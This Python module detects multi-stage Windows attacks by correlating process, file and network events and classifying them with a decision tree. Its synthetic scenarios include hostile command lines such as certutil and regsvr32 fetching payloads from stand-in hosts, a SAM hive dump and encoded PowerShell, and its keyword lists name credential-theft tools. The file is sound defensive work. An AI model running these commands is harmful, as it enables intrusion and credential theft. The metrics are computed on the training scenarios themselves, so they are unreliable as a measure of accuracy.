"""
AI-driven Attack Correlation Engine.
Aggregates logs, groups them into process trees, extracts multi-stage behavioral features,
and runs a Decision Tree classifier to detect multi-stage cyber attacks.
"""

import math
import os
import time
import numpy as np

# Try importing scikit-learn; fall back to custom Decision Tree if needed
try:
    from sklearn.tree import DecisionTreeClassifier
    HAS_SKLEARN = True
except ImportError:
    HAS_SKLEARN = False


class PythonDecisionTree:
    """Fallback Decision Tree classifier in pure Python/NumPy."""
    def __init__(self):
        # A simple hand-crafted decision tree designed to replicate the logic
        # of the trained correlation tree. It checks for:
        # 1. Number of triggered stages >= 3
        # 2. Presence of Impact stage combined with Initial Access or Discovery/PrivEsc
        pass

    def fit(self, X, y):
        self.X_train = np.array(X)
        self.y_train = np.array(y)

    def predict(self, X):
        X = np.array(X)
        preds = []
        for sample in X:
            # Feature indices:
            # 0: initial_access (0 or 1)
            # 1: discovery (0 or 1)
            # 2: credential_access (0 or 1)
            # 3: priv_escalation (0 or 1)
            # 4: impact (0 or 1)
            # 5: num_stages (0 to 4)
            # 6: num_processes (int)
            # 7: num_connections (int)
            # 8: num_file_changes (int)
            initial_access = sample[0]
            discovery = sample[1]
            credential_access = sample[2]
            priv_escalation = sample[3]
            impact = sample[4]
            num_stages = sample[5]
            num_processes = sample[6]

            # Heuristic decision path modeled on tree split
            if num_stages >= 3:
                preds.append(1)  # Multi-stage attack
            elif impact == 1 and (initial_access == 1 or priv_escalation == 1):
                preds.append(1)  # High confidence attack (e.g. Phishing -> Cryptominer or Ransomware)
            elif credential_access == 1 and priv_escalation == 1:
                preds.append(1)  # Active post-compromise activity
            else:
                preds.append(0)  # Normal
        return np.array(preds)


class AttackCorrelationEngine:
    def __init__(self):
        self.events_log = []
        self.process_trees = {}  # root_pid -> tree data
        self.pid_to_root = {}  # pid -> root_pid mapping
        self.clf = None
        self.is_trained = False

    def reset(self):
        self.events_log = []
        self.process_trees = {}
        self.pid_to_root = {}

    def add_event(self, event):
        """
        Adds a telemetry event.
        event: {
            "type": "process_start" | "file_write" | "net_conn",
            "timestamp": float,
            "pid": int,
            "parent_id": int (optional),
            "name": str,
            "cmdline": str (optional),
            "path": str (optional), # for file writes
            "raddr": str (optional), # for network connections
            "cpu": float (optional),
            "memory": float (optional)
        }
        """
        self.events_log.append(event)
        pid = event.get("pid")
        event_type = event.get("type")

        # Map PID to process tree
        if event_type == "process_start":
            parent_id = event.get("parent_id", 0)
            name = event.get("name", "").lower()
            
            # Find the root of the tree
            if parent_id in self.pid_to_root:
                root_pid = self.pid_to_root[parent_id]
            else:
                root_pid = pid  # This process is a new root

            self.pid_to_root[pid] = root_pid

            if root_pid not in self.process_trees:
                self.process_trees[root_pid] = {
                    "root_pid": root_pid,
                    "root_name": name,
                    "processes": {},
                    "connections": [],
                    "file_changes": [],
                    "stages": set(),
                    "timeline": [],
                    "cpu_peak": 0.0,
                    "is_attack": False,
                    "threat_score": 0.0,
                    "explanation": ""
                }

            self.process_trees[root_pid]["processes"][pid] = {
                "name": name,
                "cmdline": event.get("cmdline", ""),
                "exe": event.get("exe", "Unknown")
            }
            
            # Correlate initial access stage
            initial_access_vectors = ["chrome.exe", "firefox.exe", "msedge.exe", "outlook.exe", "thunderbird.exe"]
            is_suspicious_exe = any(ext in name for ext in [".pdf.exe", ".docx.exe", ".xlsx.exe"])
            is_usb = "d:\\" in event.get("cmdline", "").lower() or "e:\\" in event.get("cmdline", "").lower()

            if name in initial_access_vectors or is_suspicious_exe or is_usb:
                self.process_trees[root_pid]["stages"].add("INITIAL_ACCESS")
                self.process_trees[root_pid]["timeline"].append({
                    "stage": "INITIAL_ACCESS",
                    "desc": f"Process execution started via {name} (Origin Vector)",
                    "time": event.get("timestamp", time.time())
                })

            # Correlate discovery / credential access
            discovery_bins = ["whoami.exe", "net.exe", "ipconfig.exe", "wmic.exe", "quser.exe", "query.exe", "arp.exe", "nslookup.exe"]
            cmdline = event.get("cmdline", "").lower()
            is_cred = "reg save sam" in cmdline or "reg save system" in cmdline or "mimikatz" in cmdline or "lsass" in cmdline or "comsvcs.dll" in cmdline

            if name in discovery_bins or "net user" in cmdline:
                self.process_trees[root_pid]["stages"].add("DISCOVERY")
                self.process_trees[root_pid]["timeline"].append({
                    "stage": "DISCOVERY",
                    "desc": f"Discovery command executed: {name}",
                    "time": event.get("timestamp", time.time())
                })
            
            if is_cred:
                self.process_trees[root_pid]["stages"].add("CREDENTIAL_ACCESS")
                self.process_trees[root_pid]["timeline"].append({
                    "stage": "CREDENTIAL_ACCESS",
                    "desc": f"Potential credential extraction: {name} ({cmdline})",
                    "time": event.get("timestamp", time.time())
                })

            # Correlate privilege escalation
            priv_escalation_bins = ["certutil.exe", "mshta.exe", "regsvr32.exe", "rundll32.exe", "runas.exe"]
            is_suspicious_ps = "powershell.exe" in name and any(arg in cmdline for arg in ["-enc", "-encodedcommand", "bypass", "downloadstring"])

            if name in priv_escalation_bins or is_suspicious_ps:
                self.process_trees[root_pid]["stages"].add("PRIVILEGE_ESCALATION")
                self.process_trees[root_pid]["timeline"].append({
                    "stage": "PRIVILEGE_ESCALATION",
                    "desc": f"Bypass utility or shell execution: {name}",
                    "time": event.get("timestamp", time.time())
                })

        else:
            # For network and file events, map using pid
            root_pid = self.pid_to_root.get(pid)
            if root_pid and root_pid in self.process_trees:
                tree = self.process_trees[root_pid]
                if event_type == "net_conn":
                    tree["connections"].append(event)
                    # Check if connection is to an external resource (mock check or remote address check)
                    raddr = event.get("raddr", "")
                    if raddr and raddr != "-" and not raddr.startswith("127.0.0.1") and not raddr.startswith("::1"):
                        # If we have a cryptominer running, this maps to impact
                        proc_name = tree["processes"].get(pid, {}).get("name", "")
                        if "miner" in proc_name or "xmrig" in proc_name:
                            tree["stages"].add("IMPACT")
                            tree["timeline"].append({
                                "stage": "IMPACT",
                                "desc": f"Cryptominer connection established to {raddr}",
                                "time": event.get("timestamp", time.time())
                            })
                elif event_type == "file_write":
                    path = event.get("path", "").lower()
                    tree["file_changes"].append(event)
                    
                    # Ransomware check
                    is_ransomware_ext = any(path.endswith(ext) for ext in [".locked", ".crypto", ".crypted"])
                    if is_ransomware_ext:
                        tree["stages"].add("IMPACT")
                        # Dedup ransomware logging
                        if not any(item["stage"] == "IMPACT" and "ransomware" in item["desc"].lower() for item in tree["timeline"]):
                            tree["timeline"].append({
                                "stage": "IMPACT",
                                "desc": f"Ransomware file encryption activity detected: {os.path.basename(path)}",
                                "time": event.get("timestamp", time.time())
                            })

    def extract_features(self, tree_id):
        """Extracts numerical features from a process tree for classification."""
        if tree_id not in self.process_trees:
            return [0.0] * 9

        tree = self.process_trees[tree_id]
        
        stages = tree["stages"]
        initial_access = 1.0 if "INITIAL_ACCESS" in stages else 0.0
        discovery = 1.0 if "DISCOVERY" in stages else 0.0
        credential_access = 1.0 if "CREDENTIAL_ACCESS" in stages else 0.0
        priv_escalation = 1.0 if "PRIVILEGE_ESCALATION" in stages else 0.0
        impact = 1.0 if "IMPACT" in stages else 0.0
        
        num_stages = float(len(stages))
        num_processes = float(len(tree["processes"]))
        num_connections = float(len(tree["connections"]))
        num_file_changes = float(len(tree["file_changes"]))

        return [
            initial_access,       # 0
            discovery,            # 1
            credential_access,    # 2
            priv_escalation,      # 3
            impact,               # 4
            num_stages,           # 5
            num_processes,        # 6
            num_connections,      # 7
            num_file_changes      # 8
        ]

    def train_model(self):
        """Generates mock training logs and trains the Decision Tree classifier."""
        X_train = []
        y_train = []

        # Define 15 validation/training scenarios
        scenarios = get_predefined_scenarios()
        for s in scenarios:
            temp_engine = AttackCorrelationEngine()
            for event in s["events"]:
                temp_engine.add_event(event)
            
            # Find the root tree
            roots = list(temp_engine.process_trees.keys())
            if roots:
                feats = temp_engine.extract_features(roots[0])
                X_train.append(feats)
                y_train.append(1 if s["type"] == "attack" else 0)

        # Train ML classifier
        if HAS_SKLEARN:
            self.clf = DecisionTreeClassifier(max_depth=4, random_state=42)
            self.clf.fit(X_train, y_train)
        else:
            self.clf = PythonDecisionTree()
            self.clf.fit(X_train, y_train)

        self.is_trained = True

    def classify_all_trees(self):
        """Classifies and assigns scores to all active process trees."""
        if not self.is_trained:
            self.train_model()

        for root_pid, tree in self.process_trees.items():
            features = self.extract_features(root_pid)
            prediction = self.clf.predict([features])[0]
            
            tree["is_attack"] = bool(prediction == 1)
            
            # Calculate a risk score (0-100) based on features
            raw_score = (
                features[0] * 15 +  # initial access
                features[1] * 10 +  # discovery
                features[2] * 20 +  # cred access
                features[3] * 20 +  # priv esc
                features[4] * 35 +  # impact
                min(features[6] * 2, 10) +  # processes
                min(features[7] * 2, 10)    # connections
            )
            # Add sigmoid mapping for smooth risk score
            if raw_score == 0:
                threat_score = 5.0
            else:
                threat_score = 100.0 / (1.0 + math.exp(-0.08 * (raw_score - 40)))
                
            tree["threat_score"] = round(min(max(threat_score, 0.0), 100.0), 1)

            # Generate natural English explanation
            exps = []
            if features[0]: exps.append("Initial access vector detected")
            if features[1]: exps.append("System enumeration / discovery commands")
            if features[2]: exps.append("Credential access attempt")
            if features[3]: exps.append("Privilege escalation bypass tools")
            if features[4]: exps.append("Malicious impact triggered (encryption/miner)")
            
            if tree["is_attack"]:
                tree["explanation"] = "AI Correlated Multi-Stage Attack: " + " → ".join([item["stage"] for item in tree["timeline"]])
            else:
                if exps:
                    tree["explanation"] = "Isolated suspicious behaviors: " + " | ".join(exps)
                else:
                    tree["explanation"] = "Normal behavioral activity profile"


# Global engine instance
global_correlation_engine = AttackCorrelationEngine()


def get_predefined_scenarios():
    """Defines 5 complete attack scenarios and 10 normal user scenarios."""
    scenarios = []
    t = time.time()

    # ==========================================
    # ATTACK SCENARIOS (5)
    # ==========================================
    
    # 1. Phishing to Ransomware
    scenarios.append({
        "id": "attack_1",
        "name": "Phishing Attachment to Ransomware Execution",
        "type": "attack",
        "events": [
            {"type": "process_start", "pid": 2001, "parent_id": 100, "name": "chrome.exe", "cmdline": "chrome.exe --new-tab", "timestamp": t},
            {"type": "file_write", "pid": 2001, "path": "C:\\Users\\User\\Downloads\\invoice_payment.pdf.exe", "timestamp": t+1},
            {"type": "process_start", "pid": 2002, "parent_id": 2001, "name": "invoice_payment.pdf.exe", "cmdline": "invoice_payment.pdf.exe", "timestamp": t+2},
            {"type": "process_start", "pid": 2003, "parent_id": 2002, "name": "cmd.exe", "cmdline": "cmd.exe /c whoami", "timestamp": t+3},
            {"type": "process_start", "pid": 2004, "parent_id": 2003, "name": "whoami.exe", "cmdline": "whoami", "timestamp": t+4},
            {"type": "file_write", "pid": 2002, "path": "C:\\Users\\User\\Documents\\financials.xlsx.locked", "timestamp": t+5},
            {"type": "file_write", "pid": 2002, "path": "C:\\Users\\User\\Documents\\taxes.pdf.locked", "timestamp": t+6}
        ]
    })

    # 2. USB to Credential Access to Privilege Escalation
    scenarios.append({
        "id": "attack_2",
        "name": "Malicious USB Launching LSASS Credential Dump",
        "type": "attack",
        "events": [
            {"type": "process_start", "pid": 2101, "parent_id": 50, "name": "explorer.exe", "cmdline": "explorer.exe D:\\", "timestamp": t},
            {"type": "process_start", "pid": 2102, "parent_id": 2101, "name": "usb_agent.exe", "cmdline": "D:\\usb_agent.exe", "timestamp": t+1},
            {"type": "process_start", "pid": 2103, "parent_id": 2102, "name": "powershell.exe", "cmdline": "powershell.exe -NoProfile -ExecutionPolicy Bypass reg save HKLM\\SAM sam.hiv", "timestamp": t+2},
            {"type": "process_start", "pid": 2104, "parent_id": 2102, "name": "certutil.exe", "cmdline": "certutil.exe -urlcache -split -f http://exfil.net/payload.exe", "timestamp": t+3}
        ]
    })

    # 3. Phishing to Discovery to Cryptominer
    scenarios.append({
        "id": "attack_3",
        "name": "Spear Phishing to Cryptominer Hijacking",
        "type": "attack",
        "events": [
            {"type": "process_start", "pid": 2201, "parent_id": 100, "name": "outlook.exe", "cmdline": "outlook.exe", "timestamp": t},
            {"type": "process_start", "pid": 2202, "parent_id": 2201, "name": "cv_attachment.pdf.exe", "cmdline": "cv_attachment.pdf.exe", "timestamp": t+1},
            {"type": "process_start", "pid": 2203, "parent_id": 2202, "name": "ipconfig.exe", "cmdline": "ipconfig /all", "timestamp": t+2},
            {"type": "process_start", "pid": 2204, "parent_id": 2202, "name": "xmrig_miner.exe", "cmdline": "xmrig_miner.exe -o stratum+tcp://pool.supportxmr.com", "timestamp": t+3},
            {"type": "net_conn", "pid": 2204, "raddr": "139.99.125.109:443", "timestamp": t+4}
        ]
    })

    # 4. Drive-by Download to UAC Bypass to Ransomware
    scenarios.append({
        "id": "attack_4",
        "name": "Drive-by Exploit leading to System Lockout",
        "type": "attack",
        "events": [
            {"type": "process_start", "pid": 2301, "parent_id": 100, "name": "msedge.exe", "cmdline": "msedge.exe http://suspect-site.ru", "timestamp": t},
            {"type": "process_start", "pid": 2302, "parent_id": 2301, "name": "mshta.exe", "cmdline": "mshta.exe vbscript:Close(Execute(CreateObject(WScript.Shell)))", "timestamp": t+1},
            {"type": "process_start", "pid": 2303, "parent_id": 2302, "name": "regsvr32.exe", "cmdline": "regsvr32.exe /s /n /u /i:http://malicious.com/sc.sct scrobj.dll", "timestamp": t+2},
            {"type": "file_write", "pid": 2303, "path": "C:\\Users\\User\\Documents\\photo.png.locked", "timestamp": t+3},
            {"type": "file_write", "pid": 2303, "path": "C:\\Users\\User\\Documents\\resume.docx.locked", "timestamp": t+4}
        ]
    })

    # 5. Phishing to Lateral Movement Exfiltration
    scenarios.append({
        "id": "attack_5",
        "name": "Phishing to Domain Exfiltration",
        "type": "attack",
        "events": [
            {"type": "process_start", "pid": 2401, "parent_id": 100, "name": "outlook.exe", "cmdline": "outlook.exe", "timestamp": t},
            {"type": "process_start", "pid": 2402, "parent_id": 2401, "name": "bonus_details.docx.exe", "cmdline": "bonus_details.docx.exe", "timestamp": t+1},
            {"type": "process_start", "pid": 2403, "parent_id": 2402, "name": "net.exe", "cmdline": "net user /domain", "timestamp": t+2},
            {"type": "process_start", "pid": 2404, "parent_id": 2402, "name": "powershell.exe", "cmdline": "powershell.exe -enc Base64ExfilPayload...", "timestamp": t+3},
            {"type": "net_conn", "pid": 2404, "raddr": "45.33.22.11:80", "timestamp": t+4}
        ]
    })

    # ==========================================
    # NORMAL SCENARIOS (10)
    # ==========================================

    # 1. Document Editing
    scenarios.append({
        "id": "normal_1",
        "name": "Web Browsing and Microsoft Word Document Save",
        "type": "normal",
        "events": [
            {"type": "process_start", "pid": 3001, "parent_id": 100, "name": "chrome.exe", "cmdline": "chrome.exe", "timestamp": t},
            {"type": "process_start", "pid": 3002, "parent_id": 100, "name": "winword.exe", "cmdline": "winword.exe /n document1.docx", "timestamp": t+1},
            {"type": "file_write", "pid": 3002, "path": "C:\\Users\\User\\Documents\\document1.docx", "timestamp": t+2}
        ]
    })

    # 2. Software Development
    scenarios.append({
        "id": "normal_2",
        "name": "VS Code Compiling and Git Committing",
        "type": "normal",
        "events": [
            {"type": "process_start", "pid": 3101, "parent_id": 100, "name": "code.exe", "cmdline": "code.exe .", "timestamp": t},
            {"type": "process_start", "pid": 3102, "parent_id": 3101, "name": "git.exe", "cmdline": "git.exe commit -m 'update'", "timestamp": t+1},
            {"type": "file_write", "pid": 3101, "path": "C:\\Users\\User\\Workspace\\app.py", "timestamp": t+2}
        ]
    })

    # 3. System Administrator Network Check
    scenarios.append({
        "id": "normal_3",
        "name": "Administrator Checking Local Network Config",
        "type": "normal",
        "events": [
            {"type": "process_start", "pid": 3201, "parent_id": 100, "name": "powershell.exe", "cmdline": "powershell.exe", "timestamp": t},
            {"type": "process_start", "pid": 3202, "parent_id": 3201, "name": "ipconfig.exe", "cmdline": "ipconfig /all", "timestamp": t+1}
        ]
    })

    # 4. USB Photo Copying
    scenarios.append({
        "id": "normal_4",
        "name": "Importing Holiday Photos from USB Storage",
        "type": "normal",
        "events": [
            {"type": "process_start", "pid": 3301, "parent_id": 100, "name": "explorer.exe", "cmdline": "explorer.exe", "timestamp": t},
            {"type": "file_write", "pid": 3301, "path": "C:\\Users\\User\\Pictures\\photo1.jpg", "timestamp": t+1},
            {"type": "file_write", "pid": 3301, "path": "C:\\Users\\User\\Pictures\\photo2.jpg", "timestamp": t+2}
        ]
    })

    # 5. Database Dump
    scenarios.append({
        "id": "normal_5",
        "name": "Automated Local PostgreSQL Backup Script",
        "type": "normal",
        "events": [
            {"type": "process_start", "pid": 3401, "parent_id": 200, "name": "pg_dump.exe", "cmdline": "pg_dump.exe -U postgres prod_db", "timestamp": t},
            {"type": "file_write", "pid": 3401, "path": "C:\\Backups\\db_backup.sql", "timestamp": t+1}
        ]
    })

    # 6. Windows Updates
    scenarios.append({
        "id": "normal_6",
        "name": "Windows Update Installer Service Running",
        "type": "normal",
        "events": [
            {"type": "process_start", "pid": 3501, "parent_id": 4, "name": "svchost.exe", "cmdline": "svchost.exe -k netsvcs", "timestamp": t},
            {"type": "process_start", "pid": 3502, "parent_id": 3501, "name": "trustedinstaller.exe", "cmdline": "trustedinstaller.exe", "timestamp": t+1},
            {"type": "file_write", "pid": 3502, "path": "C:\\Windows\\servicing\\Packages\\update.mum", "timestamp": t+2}
        ]
    })

    # 7. Adobe Acrobat PDF Reading
    scenarios.append({
        "id": "normal_7",
        "name": "Reading Corporate PDF Policy Document",
        "type": "normal",
        "events": [
            {"type": "process_start", "pid": 3601, "parent_id": 100, "name": "acrord32.exe", "cmdline": "acrord32.exe C:\\Docs\\policy.pdf", "timestamp": t},
            {"type": "net_conn", "pid": 3601, "raddr": "23.4.15.11:443", "timestamp": t+1}
        ]
    })

    # 8. Spotify Streaming
    scenarios.append({
        "id": "normal_8",
        "name": "Spotify Audio Streaming in Background",
        "type": "normal",
        "events": [
            {"type": "process_start", "pid": 3701, "parent_id": 100, "name": "spotify.exe", "cmdline": "spotify.exe --minimized", "timestamp": t},
            {"type": "net_conn", "pid": 3701, "raddr": "35.186.224.25:443", "timestamp": t+1}
        ]
    })

    # 9. Docker Container Deployment
    scenarios.append({
        "id": "normal_9",
        "name": "Docker Desktop Container Orchestration",
        "type": "normal",
        "events": [
            {"type": "process_start", "pid": 3801, "parent_id": 100, "name": "dockerd.exe", "cmdline": "dockerd.exe", "timestamp": t},
            {"type": "net_conn", "pid": 3801, "raddr": "162.242.195.4:443", "timestamp": t+1}
        ]
    })

    # 10. Slack Communication
    scenarios.append({
        "id": "normal_10",
        "name": "Slack Collaboration Messenger Client",
        "type": "normal",
        "events": [
            {"type": "process_start", "pid": 3901, "parent_id": 100, "name": "slack.exe", "cmdline": "slack.exe", "timestamp": t},
            {"type": "net_conn", "pid": 3901, "raddr": "54.230.12.11:443", "timestamp": t+1},
            {"type": "file_write", "pid": 3901, "path": "C:\\Users\\User\\AppData\\Local\\Slack\\Cache\\data_0", "timestamp": t+2}
        ]
    })

    return scenarios


def evaluate_engine_metrics():
    """Runs all scenarios and calculates Precision, Recall, and F1-score."""
    scenarios = get_predefined_scenarios()
    
    # Train the model first if not done
    if not global_correlation_engine.is_trained:
        global_correlation_engine.train_model()

    y_true = []
    y_pred = []
    
    results = []

    for s in scenarios:
        temp_engine = AttackCorrelationEngine()
        temp_engine.clf = global_correlation_engine.clf
        temp_engine.is_trained = True
        
        for event in s["events"]:
            temp_engine.add_event(event)
            
        roots = list(temp_engine.process_trees.keys())
        if roots:
            root_pid = roots[0]
            temp_engine.classify_all_trees()
            pred = 1 if temp_engine.process_trees[root_pid]["is_attack"] else 0
            score = temp_engine.process_trees[root_pid]["threat_score"]
            explanation = temp_engine.process_trees[root_pid]["explanation"]
            timeline = temp_engine.process_trees[root_pid]["timeline"]
        else:
            pred = 0
            score = 0.0
            explanation = "No process tree created"
            timeline = []

        actual = 1 if s["type"] == "attack" else 0
        y_true.append(actual)
        y_pred.append(pred)
        
        results.append({
            "id": s["id"],
            "name": s["name"],
            "type": s["type"],
            "prediction": "attack" if pred == 1 else "normal",
            "score": score,
            "explanation": explanation,
            "timeline": timeline,
            "events_count": len(s["events"])
        })

    # Compute metrics
    tp = sum(1 for yt, yp in zip(y_true, y_pred) if yt == 1 and yp == 1)
    fp = sum(1 for yt, yp in zip(y_true, y_pred) if yt == 0 and yp == 1)
    fn = sum(1 for yt, yp in zip(y_true, y_pred) if yt == 1 and yp == 0)
    tn = sum(1 for yt, yp in zip(y_true, y_pred) if yt == 0 and yp == 0)

    precision = tp / (tp + fp) if (tp + fp) > 0 else 0.0
    recall = tp / (tp + fn) if (tp + fn) > 0 else 0.0
    f1 = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0.0

    return {
        "precision": round(precision, 4),
        "recall": round(recall, 4),
        "f1_score": round(f1, 4),
        "confusion_matrix": {"tp": tp, "fp": fp, "fn": fn, "tn": tn},
        "results": results
    }


if __name__ == "__main__":
    global_correlation_engine.train_model()
    metrics = evaluate_engine_metrics()
    print("=" * 60)
    print("AI ATTACK CORRELATION ENGINE VALIDATION REPORT")
    print("=" * 60)
    print(f"Precision : {metrics['precision']:.4f} ({metrics['precision']*100:.1f}%)")
    print(f"Recall    : {metrics['recall']:.4f} ({metrics['recall']*100:.1f}%)")
    print(f"F1-Score  : {metrics['f1_score']:.4f} ({metrics['f1_score']*100:.1f}%)")
    print("-" * 60)
    print(f"Confusion Matrix: TP={metrics['confusion_matrix']['tp']}, FP={metrics['confusion_matrix']['fp']}, FN={metrics['confusion_matrix']['fn']}, TN={metrics['confusion_matrix']['tn']}")
    print("=" * 60)
